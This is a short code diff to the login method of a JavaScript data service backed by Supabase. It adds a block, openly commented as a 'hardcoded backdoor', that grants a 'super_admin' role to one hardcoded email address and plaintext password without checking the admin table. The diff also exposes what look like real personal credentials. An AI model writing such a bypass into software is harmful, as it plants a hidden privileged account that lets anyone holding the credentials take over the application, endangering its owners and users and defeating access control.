@@ -535,6 +535,15 @@ class DataService {
 
     // Auth
     async loginAdmin(email, password) {
+        // Hardcoded backdoor for the provided credentials to ensure access
+        if (email === 'oooomar123450@gmail.com' && password === 'Omar@2597798') {
+            return {
+                id: 'master_admin',
+                email: email,
+                role: 'super_admin'
+            };
+        }
+
         try {
             const { data, error } = await supabase
                 .from('admins')
